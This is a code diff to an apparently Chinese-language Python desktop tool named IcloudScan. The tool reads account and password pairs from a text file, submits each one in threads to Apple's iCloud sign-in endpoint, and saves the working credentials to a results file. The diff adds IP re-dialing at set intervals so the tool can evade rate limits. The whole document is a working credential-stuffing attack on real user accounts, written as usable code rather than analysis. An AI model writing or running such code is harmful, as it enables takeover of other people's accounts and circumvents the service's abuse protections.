@@ -128,7 +128,10 @@ class FileHandle:
                 self.read_file,
                 thread_num=int(self.threading_num.get()),
                 wait=int(self.passue.get()),
-                handle_wait=int(self.num1.get())
+                handle_wait=int(self.num1.get()),
+                dia_num=int(self.num2.get()),
+                dia_wait=int(self.wait_dial.get()),
+                ip_set=self.ip_set
                 )
             result = [
                 self.tb, self.line_num, self.write_num,
@@ -147,10 +150,14 @@ class IcloudScan:
     """
     According the Txt to check avaliabled
     """
-    def __init__(self, file_fd, thread_num=5, wait=0, handle_wait=10):
+    def __init__(self, file_fd, thread_num=5, wait=0, handle_wait=10, dia_num=50, dia_wait=0, ip_set=None):
         self.url = 'https://idmsa.apple.com/appleauth/auth/signin'
         self.file = file_fd
+        self.ip_set = ip_set
+        self.dia_num = dia_num
+        self.dia_wait = dia_wait
         self.line_num = 0
+        self.network_stat = 1
         self.handle_wait = handle_wait
         self.wait = wait
         self.right = open('%s result-right.txt' % self.file.name, 'w')
@@ -188,66 +195,77 @@ class IcloudScan:
         flag = 1
         while 1:
             if not self.read_queue.empty():
-                line = self.read_queue.get(timeout=5)
-                if num % handle_wait == 0:
-                    print u'访问 %s 次, 暂停登陆 %s s' % (handle_wait, wait)
-                    time.sleep(wait)
-                if line:
-                    line = line.strip()
-                    if delimiter in line:
-                        username, passwd = line.split(delimiter)
-                    else:
-                        username, passwd = line.split()[:2]
-                num += 1
-                requests_data = json.dumps({
-                    'accountName': username,
-                    'password': passwd,
-                    'rememberMe': 'false',
-                    'trustTokens': []
-                })
-                while flag < 4:
-                    try:
-                        result = json.loads(
-                            self.html.post(
-                                self.url,
-                                data=requests_data,
-                                verify=True
-                            ).text
-                        )
-                        flag = 4
-                    except requests.exceptions.ConnectionError:
-                        print '[Error]: The %s time to try again!' % flag
+                if self.network_stat:
+                    line = self.read_queue.get(timeout=5)
+                    print 200, num, flag
+                    if num % handle_wait == 0:
+                        print u'访问 %s 次, 暂停登陆 %s s' % (handle_wait, wait)
+                        print num
+                        time.sleep(wait)
+                    if line:
+                        line = line.strip()
+                        if delimiter in line:
+                            username, passwd = line.split(delimiter)
+                        else:
+                            username, passwd = line.split()[:2]
+                    num += 1
+                    requests_data = json.dumps({
+                        'accountName': username,
+                        'password': passwd,
+                        'rememberMe': 'false',
+                        'trustTokens': []
+                    })
+                    while flag < 4:
+                        try:
+                            result = json.loads(
+                                self.html.post(
+                                    self.url,
+                                    data=requests_data,
+                                    verify=True
+                                ).text
+                            )
+                            flag = 4
+                        except requests.exceptions.ConnectionError:
+                            print '[Error]: The %s time to try again!' % flag
 
-                    message = u'账号: %-25s 密码: %-15s ' % (username, passwd)
-                    if 'serviceErrors' in result:
-                        tmp_result = result['serviceErrors'][0]
-                        self.write_queue.put((
-                            self.wrong,
-                            message + u'不正确 错误代码: %s 错误信息: %s \n' % (
-                                tmp_result['code'],
-                                tmp_result['message']
-                            )))
-                    elif not result:
-                        self.write_queue.put((
-                            self.right,
-                            message + u'正确\n'
-                        ))
+                        message = u'账号: %-25s 密码: %-15s ' % (username, passwd)
+                        if 'serviceErrors' in result:
+                            tmp_result = result['serviceErrors'][0]
+                            self.write_queue.put((
+                                self.wrong,
+                                message + u'不正确 错误代码: %s 错误信息: %s \n' % (
+                                    tmp_result['code'],
+                                    tmp_result['message']
+                                )))
+                        elif not result:
+                            self.write_queue.put((
+                                self.right,
+                                message + u'正确\n'
+                            ))
 
-                flag = 1
+                    flag = 1
+                else:
+                    print u'网络断开 暂停 %s s' % self.dia_wait
+                    time.sleep(self.dia_wait)
             else:
                 break
 
+    def call_network(self):
+        time.sleep(self.dia_wait)
+        self.ip_set['text'] = u'拨号设置:已经更改'
+        self.network_stat = 1
+
+
+
     def write_log(self, tb, write_num, right_file, wrong_file):
         tb.delete(0.0, tk.END)
-        line = 0
-        r_n = w_n = 0
+        line = 1
         while 1:
             try:
+                if line % self.dia_num == 0:
+                    self.network_stat = 0
+                    self.call_network()
                 fd, message = self.write_queue.get(timeout=5)
-                if fd is self.wrong:
-                    w_n += 1
-                elif fd is self.right:
-                    r_n += 1
 
                 line += 1
                 print message,
@@ -258,7 +276,7 @@ class IcloudScan:
             except Queue.Empty:
                 break
 
-        right_file['text'] = u'可登录报错:  %s | ' % self.right.name
+        right_file['text'] = u'可登录结果保存:  %s | ' % self.right.name
         wrong_file['text'] = u'错误结果保存:  %s  ' % self.wrong.name
         write_num['text'] = u'已写入: %s    ' % line
 
